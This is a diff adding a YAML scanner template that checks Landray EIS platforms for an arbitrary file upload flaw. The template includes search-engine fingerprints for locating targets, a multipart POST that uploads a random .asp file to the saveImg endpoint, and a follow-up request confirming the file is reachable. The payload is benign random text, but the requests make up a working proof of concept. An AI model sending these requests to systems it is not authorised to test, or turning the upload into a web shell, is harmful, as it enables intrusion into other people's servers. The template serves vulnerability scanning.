@@ -1,0 +1,41 @@
+id: landray-eis-saveimg-fileupload
+
+info:
+  name: 蓝凌EIS智慧协同平台任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    fofa: icon_hash="953405444"
+    zoomeye: app:"蓝凌EIS智慧协同平台"
+  tags: landray,fileupload
+  created: 2023/10/18
+
+set:
+  randstr: randomLowercase(10)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /eis/service/api.aspx?action=saveImg
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"filename=\"{{randstr}}.asp\"\r\n\
+        Content-Type: text/html\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'/files/editor_img')
+    output:
+      filename: string(response.body)
+  r1:
+    request:
+      method: GET
+      path: /{{filename}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
